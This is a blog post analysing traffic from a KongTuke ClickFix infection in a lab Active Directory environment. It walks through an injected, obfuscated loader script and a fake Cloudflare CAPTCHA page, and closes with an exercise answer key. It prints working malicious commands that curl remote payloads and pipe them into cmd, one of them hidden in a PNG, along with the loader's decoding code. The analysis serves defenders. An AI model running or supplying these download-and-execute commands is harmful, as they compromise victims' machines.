---
layout: post
title: Traffic Analysis - KONGTUKE REBUKE
subtitle: Quite A Circus Backstage.
cover-img: /assets/img/analysis/malware-analysis.png
thumbnail-img: ""
tags: [analysis, security, network]
---

* TOC
{:toc}

## BACKGROUND

I investigated recent Kongtuke ClickFix activity using a domain-joined host in an Active Directory environment.

The characteristics of this environment are:

- LAN segment range: 10.9.11\[.\]0/24 (10.9.11\[.\]0 through 10.9.11\[.\]255)
- Domain: overhands\[.\]org
- AD environment name: OVERHANDS
- Active Directory (AD) domain controller: 10.9.11\[.\]2 - WIN-GTWXC9UYSE4
- LAN segment gateway: 10.9.11\[.\]1
- LAN segment broadcast address: 10.9.11\[.\]255

## METHODOLOGY

The infection method is **ClickFix**, which uses a CAPTCHA-solving webpage to trick users into running a series of commands under the guise of completing CAPTCHA verification.

I have conducted an in-depth malware analysis of these techniques in the following articles.

1. [Malware Analysis - Lumma Stealer][lumma-ma]
2. [Traffic Analysis - LUMMA IN THE ROOM-AH][lumma-na]

In the initial triage, we note the top endpoints involved in conversions by number of packets and bytes transferred. In this technique, a large number of back-and-forth connections would be made from an endpoint to multiple URLs/IPs.

![Top conversation][top-conversation]

We hypothetically assume the system with IP `10.9.11[.]135` is infected. To confirm the hypothesis, leverage DNS packets to extract and filter the domains for subsequent reputation analysis (VT).

| Domain                  | Reputation | Community |
| ----------------------- | ---------- | --------- |
| aatthews[.]cfd          | 19/92      | -60       |
| hyko[.]fif-lost[.]com   | 1/92       | 0         |
| logincrypt8338[.]com    | 18/92      | -60       |
| opscast3707[.]net       | 1/92       | 0         |
| quadcinema[.]com        | 0/92       | 0         |
| stream[.]fif-lost[.]com | 1/92       | 0         |
| winrun2915[.]com        | 6/92       | -11       |

We correlate DNS queries to identify potentially malicious connections. We then proceed to build a profile of the infected system.

To identify the MAC address of the infected system, we leverage the ARP protocol.

![MAC address][mac-address]

Subsequently, the hostname and username can be retrieved from Kerberos traffic.

![Host and User name][host-user-name]

Finally, we retrieve the user's full name using the SAMR protocol.

![Full name][full-name]

## RABBIT HOLE

According to the briefing, the infection is delivered through a legitimate website, `quadcinema[.]com`, which contains an injected script. However, due to TLS encryption, we cannot inspect the packet contents.

![Encrypted communication][encrypted-communication]

We can continue the analysis using the available artifacts. We extract all URLs from the saved HTML response to identify any suspicious script injections.

![Injected script][injected-script]

The script, `hxxps[://]hodkiewhcz[.]sbs/6oll0u79[.]js`, is completely unrelated to the parent domain and is obfuscated.

![Obfuscated script][obfuscated-script]

Since the available tools are unable to deobfuscate the script, we proceed with manual deobfuscation.

**SCRIPT WALKTHROUGH #1**

![Cleaned script 1][cleaned-script-1]

The function performs the following actions:

1. Retrieves its execution domain, i.e., `hodkiewhcz[.]sbs`, from the HTML document.
2. Performs canvas fingerprinting to collect browser and system information.
3. Creates a hidden iframe.

**SCRIPT WALKTHROUGH #2**

![Cleaned script 2][cleaned-script-2]

The function performs the following actions:

1. Sends an HTTP GET request and processes the response.
2. Creates a hidden iframe containing another embedded script.

**SCRIPT WALKTHROUGH #3**

![Cleaned script 3][cleaned-script-3]

The function performs the following actions:

1. Copies the received command to the victim's clipboard.
2. Sends an HTTP POST request and processes the response.

**SCRIPT WALKTHROUGH #4**

![Cleaned script 4][cleaned-script-4]

The function performs the following actions:

1. Initiates multiple HTTP requests to different endpoints.
2. Decodes the received payload using Base64 and XOR operations to extract the HTML content.

**EMBEDDED SCRIPT WALKTHROUGH #1**

![Cleaned embedded script 1][cleaned-embedded-script-1]

The function performs the following actions:

1. Initiates multiple HTTP requests to different endpoints.
2. Decodes the received response using Base64 encoding.

**EMBEDDED SCRIPT WALKTHROUGH #2**

![Cleaned embedded script 2][cleaned-embedded-script-2]

The function performs the following actions:

1. Similar pattern of HTTP requests but uses different parameters.

<details markdown="1">
<summary>Deobfuscated</summary>
The cleaned files can be referenced [here][gist].
</details>

## CHRONOLOGY

Initially, when the injected script executes, it retrieves the domain from which it was loaded, i.e., `hodkiewhcz[.]sbs`.

It then makes an initial GET request to the following endpoint:

```
GET /api/v1/session?_=17891397175920.38846283281246374 HTTP/1.1
Host: hodkiewhcz.sbs
```

The following code is responsible for generating and sending this initial GET request.

```javascript
bp + "/api/v1/session?_=" + Date.now() + Math.random(); // line 298
```

The attacker-controlled server responds to this request as follows:

```json
{ "t": "d1374d07d09df89daff257e58dd199a6", "d": 97, "ts": 1789139717780 }
```

The above response contains two parameters: `t` (token) and `d` (difficulty), which are used to calculate the nonce through extensive mathematical computations. This mechanism acts as a Proof-of-Work (PoW) challenge, potentially intended to filter out bots and automated sandbox environments.

```javascript
var fp = _tfsqd(); // Function _tfsqd() returns fingerprinted data. line 303
var up = new URLSearchParams(_dqte.location.search);
var nonce = _nyyps(tk.t, tk.d || 97); // Function _nyyps() returns nonce.
var elapsed = Date.now() - (tk.ts || Date.now());
var wait = Math.max(2000 - elapsed, 500);
```

From the above example, the nonce calculated would be,

![Calculated nonce][calculated-nonce]

The client then initiates another POST request to the following endpoint with the fingerprinted data, token, and calculated nonce (for verification).

```
POST /api/v1/verify HTTP/1.1
Host: hodkiewhcz.sbs
{"f":{"w":false,"ic":true,"cr":true,"sw":1098,"sh":618,"cd":24,"pr":1.75,"asr":48000,"gr":"ANGLE (Microsoft, Microsoft Basic Render Driver (0x0000008C) Direct3D11 vs_5_0 ps_5_0, D3D11)","gv":"Google Inc. (Microsoft)","ch":-1420227189,"pc":5,"ln":"en","ts":false,"tz":0,"hp":false,"hn":false,"hs":false,"hc":0,"hd":false,"np":1,"lie":0,"ifc":0,"et":12},"u":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0","s":"quadcinema.com","ut":"","uc":"","um":"","gc":"","r":"https://www.google.com/","_tk":"d1374d07d09df89daff257e58dd199a6","_n":27}
```

After verification, the server responds to this request as follows:

```json
{
  "s": 1,
  "h": "<REPLACED_FOR_BREVITY>",
  "xk": 45,
  "ct": "f295473af067014ea9626ff357fe5067"
}
```

The response contains XOR-encrypted and Base64-encoded HTML content in the `h` parameter, along with the corresponding XOR key in the `xk` parameter.

The following code performs the decoding and replaces the current document with the decoded content.

```javascript
var _xd = atob(r.h), // Decodes base64. line 303
  _xk = r.xk || 0,
  _html = "";
if (_xk) {
  for (var _xi = 0; _xi < _xd.length; _xi++) {
    _html += String.fromCharCode(_xd.charCodeAt(_xi) ^ _xk); // XOR-ed with received key.
  }
} else {
  _html = _xd;
}
_iraj(
  _html, // Current document replaced with decoded HTML.
  bp +
    (function () {
      s = "/api/v1/verify";
      return s;
    })(),
  r.ct || "",
);
```

We use CyberChef to get decoded data,

![Decoded HTML][decoded-html]

The rendered HTML is a generic ClickFix template that impersonates Cloudflare's CAPTCHA verification page.

![Rendered HTML][rendered-html]

The template contains another Base64-encoded command that is copied to the clipboard for execution through the Windows Run dialog (Win + R).

![Decoded command][decoded-command]

```bash
conhost --headless cmd /v /c "set aip=https:&set htp=//winrun2915.com/b?t=U43ev5YO&for /f %d in ('where cu??.e??') do for /f %b in ('where cm?.e??') do %d --proxy-negotiate -U : -s !aip!!htp!| %b"
```

After a series of requests with different parameters, at last a request is made to the following endpoint that retrieves an image,

```
GET /ci?v=20260911 HTTP/1.1
Host: hodkiewhcz.sbs
```

The embedded script initiates this request,

```javascript
try { // line 153
  var _kydlc = new Image();
  _kydlc.src = _vtljn + "/ci?v=20260911";
} catch (e) {}
```

Interestingly, as observed in our earlier analysis, a PNG file may contain embedded data intended for later use. Similarly, in this case, we can identify another command embedded within the PNG file.

![Embedded data in image][data-image]

```bash
set "D=echo." & ( for /F "delims=" %l in ('curl --ssl-no-revoke https://www.xols-qojze.com/dflkhngiojg.pdf') do set "D=!D! & %l" ) & cmd.exe /v:on /c !D! & echo "HUI34tb"
```

Due to the length of the analysis, we will continue exploring the remaining stages in the next article.

## QUESTION & ANSWER

1. What is the IP address of the infected Windows client? **10.9.11[.]135**
2. What is the MAC address of the infected Windows client? **08:d4:0c:7a:29:1e**
3. What is the host name of the infected Windows client? **DESKTOP\-6T17ZFM**
4. What is the user account name from the infected Windows client? **gmcdowell**
5. What is the full name of the user from the user account? **Gabriel McDowell**

[lumma-ma]: /blog/2024-10-05-malware-analysis-lumma-stealer/
[lumma-na]: /blog/2026-10-04-traffic-analysis-lumma-in-the-room-ah/
[top-conversation]: ../assets/img/nta/kongtuke/top-conversation.png
[mac-address]: ../assets/img/nta/kongtuke/infected-system-mac.png
[host-user-name]: ../assets/img/nta/kongtuke/infected-system-host-user-name.png
[full-name]: ../assets/img/nta/kongtuke/infected-system-full-name.png
[encrypted-communication]: ../assets/img/nta/kongtuke/encrypted-communication.png
[injected-script]: ../assets/img/nta/kongtuke/injected-script.png
[obfuscated-script]: ../assets/img/nta/kongtuke/obfuscated-script.png
[cleaned-script-1]: ../assets/img/nta/kongtuke/cleaned-script-1.png
[cleaned-script-2]: ../assets/img/nta/kongtuke/cleaned-script-2.png
[cleaned-script-3]: ../assets/img/nta/kongtuke/cleaned-script-3.png
[cleaned-script-4]: ../assets/img/nta/kongtuke/cleaned-script-4.png
[cleaned-embedded-script-1]: ../assets/img/nta/kongtuke/cleaned-embedded-script-1.png
[cleaned-embedded-script-2]: ../assets/img/nta/kongtuke/cleaned-embedded-script-2.png
[gist]: https://gist.github.com/mandarnaik016/d573ab57d5605673b44a064dcffd0a15
[calculated-nonce]: ../assets/img/nta/kongtuke/calculated-nonce.png
[decoded-html]: ../assets/img/nta/kongtuke/decoded-html.png
[rendered-html]: ../assets/img/nta/kongtuke/rendered-html.png
[decoded-command]: ../assets/img/nta/kongtuke/decoded-command.png
[data-image]: ../assets/img/nta/kongtuke/data-image.png
